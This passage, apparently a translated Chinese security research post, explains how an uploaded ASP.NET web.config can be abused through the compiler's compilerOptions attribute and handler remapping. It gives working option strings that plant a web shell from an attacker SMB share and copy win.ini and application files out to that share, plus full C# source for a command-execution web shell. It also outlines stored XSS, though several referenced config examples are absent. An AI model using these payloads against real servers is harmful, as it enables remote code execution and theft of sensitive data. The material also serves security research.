可以将`compiler`元素的`type`属性设置为以下默认类型之一：
  * C#:*
    Microsoft.CSharp.CSharpCodeProvider,System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
这使用`csc.exe`命令进行编译。
VB.NET：
    Microsoft.VisualBasic.VBCodeProvider, System, Version=2.0.3600.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
使用vbc.exe命令进行编译。
Jscript.NET:
    Microsoft.JScript.JScriptCodeProvider, Microsoft.JScript, Version=7.0.3300.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
这使用`jsc.exe`命令进行编译。
这些命令通常可以在`.NET`文件夹中找到。 对于`.NET v4`，该文件夹将是：
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\
上面`web.config`模板文件中的`compilerOptions`属性的值将作为参数添加到编译器命令中。这里密文可以使用空格字符提供多个参数。
如果没有为编译器命令提供选项，则`compilerOptions`属性的值将被视为要编译的编译器的文件名。
`＃`字符为终止命令，`@`字符加载另一个文件，如[本文](https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/listed-alphabetically)中所述。
如果我们可以在编译`C＃，VB.NET或Jscript.NET`文件时找到执行命令的方法，那么可以通过编译可能来自远程共享驱动器或以前上传的静态文件的附加文件来轻松利用它。但是在对此进行研究时，我们找不到任何东西。
应该注意的是，如果`ASP.NET`页面存在于上传`web.config`文件的同一文件夹中，则在我们更改编译过程时，它们将使用我在此提供的示例进行工作。因此，如果只有一次上传`web.config`文件并且无法再次重写时，我们应该注意该文件的内容，确保`web.config`有效。
##### 2.1.1 创建Web shell
以下字符串显示了`compilerOptions`属性，该属性可用于在`Web`目录中创建包含一些二进制数据的`Web shell`：
    /resource:"\\KaliBoxIP\Public\webshell.txt" /out:"C:\appdata\wwwroot\myapp\webshell.aspx" #
使用上述设置浏览`web.config`文件后，将在请求的路径中创建具有`webshell.aspx`名称的二进制文件。
在此处了解服务器上的应用程序路径非常重要。 当显示`ASP.NET`失败的错误消息时，可以简单地通过错误来显示应用程序的路径。
建议在另一个文件而不是`web.config`文件本身中创建一个错误，但是如果以后可以修改它，这里只是一个`web.config`文件，它只显示一个错误：
            IDontExist!
除了可以在创建`Web
shell`之后更改`web.config`文件以删除`compilerOptions`属性以允许正常的编译过程之外，还应该在我们的`web.config`文件上传之外创建`Web
shell`。
应该注意的是，`webshell.txt`中的代码将嵌入到包含二进制数据的`webshell.aspx`的中间。
由于这不是`webshell`的副本，因此可以用作获取访问权限的第一阶段。
**无法访问SMB的解决方案**
如果目标无法通过`SMB`进行通信，则可以使用允许的扩展名上载`Web shell`，以将其包含在`/resource`选项中：
    /resource:"C:\appdata\wwwroot\myapp\attachment\myshell.config" /out:"C:\appdata\wwwroot\myapp\webshell.aspx" #
##### 2.1.2 接管现有的ASPX文件
当`ASPX`文件存在于所上传`web.config`文件的同一文件夹中时，可以修改编译过程进行接管操作。
了解应用程序和虚拟目录对于使用此技术非常重要。 我将使用以下示例解释这一点：
`web.config`文件可以在`C:\appdata\wwwroot\myapp\attachment\`上传，`file.aspx`也存在于同一路径中，可通过以下URL访问：
    https://victim.com/myapp/attachment/file.aspx
现在可以使用以下编译器选项来接管此文件：
    \\KaliBoxIP\Public\webshellcs.txt #
或者：
    "C:\appdata\wwwroot\myapp\attachment\webshellcs.txt" #
`webshellcs.txt`文件的内容是：
    namespace ASP
    {
        using System;
        [System.Runtime.CompilerServices.CompilerGlobalScopeAttribute()]
        public class attachment_file_aspx : global::System.Web.UI.Page, System.Web.IHttpHandler
        {
            private void @__Render__control1(System.Web.UI.HtmlTextWriter @__w, System.Web.UI.Control parameterContainer)
            {
                if (!String.IsNullOrEmpty(Request["cmd"]))
                {
                    System.Diagnostics.Process process = new System.Diagnostics.Process();
                    process.StartInfo.FileName = Request["cmd"];
                    process.StartInfo.Arguments = Request["arg"];
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;
                    process.Start();
                    //* Read the output (or the error)
                    string output = process.StandardOutput.ReadToEnd();
                    @__w.Write("Result:");
                    @__w.Write(output);
                }
                else
                {
                    @__w.Write("Use:\"?cmd=cmd.exe&arg=/c dir\" as an example!");
                }
            }
            [System.Diagnostics.DebuggerNonUserCodeAttribute()]
            protected override void FrameworkInitialize()
            {
                this.SetRenderMethodDelegate(new System.Web.UI.RenderMethod(this.@__Render__control1));
            }
        }
    }
##### 2.1.3 窃取内部文件
以下字符串显示compilerOptions属性：
    /resource:c:\windows\win.ini /out:\\KaliBoxIP\Public\test.bin
在上载文件夹中打开现有ASP.NET页面后，将在包含`win.ini`文件的共享文件夹中创建`test.pdb和test.bin`文件。
这对于获取应用程序的`web.config`文件尤其有用，因为它可能包含敏感数据，例如可以使用远程代码执行的机器密钥。
##### 2.1.4 窃取应用的更多数据
以下字符串显示compilerOptions属性：
    /resource:\\KaliBoxIP\Public\test.txt -bugreport:\\KaliBoxIP\Public\foobar1.txt /errorreport:none
在该文件夹中打开现有`ASP.NET`页面后，这将在共享路径上创建一个大文件，该文件可能包含有关应用程序或其基础技术的敏感数据。
显然，当路径已知并且可以远程下载文件时，也可以在同一Web服务器上创建此文件。
#### 2.2 接管上传的.NET文件
以下web.config可用于接管现有的Web服务文件：
这将从SMB共享加载webshell.aspx文件，并在打开该文件夹中的ASMX文件时执行它。
也可以重新映射.master和.ascx扩展，并像ASMX文件一样使用它们。
上传这些文件的可能性高于其他ASP.NET扩展，例如`.aspx，.asmx，.ashx，.svc和.soap`，它们也可以使用相同的技术接管。
以下web.config文件显示了可以接管多个文件扩展名的示例：
当`SMB`被阻止时，可能很难使用此技术，因为`wsdlHelpGenerator`元素的href属性中的文件扩展名很重要。
#### 2.3 存储XSS
也可以创建存储型XSS。 当其他方法因任何原因不起作用时，这可能很有用。
在上文中讨论了通过上传`web.config`文件使应用受XSS攻击的一些方法。 例如，当允许下载某些文件时，可以通过操作mimetypes进行XSS攻击。
以下示例显示.txt文件如何作为`.html`文件运行：
在这篇博客文章中，还发现了两个新ASP.NET处理程序。
##### 2.3.1 使用State Application处理程序
StateApplication处理程序是System.Web.SessionState命名空间内的一个内部类，用于缓存并且不应该直接从用户代码调用。
使用任意文本替换任何现有文件的响应可能会被滥用。
以下web.config文件显示了一个示例，使用该示例使用XSS有效内容替换web.config的响应：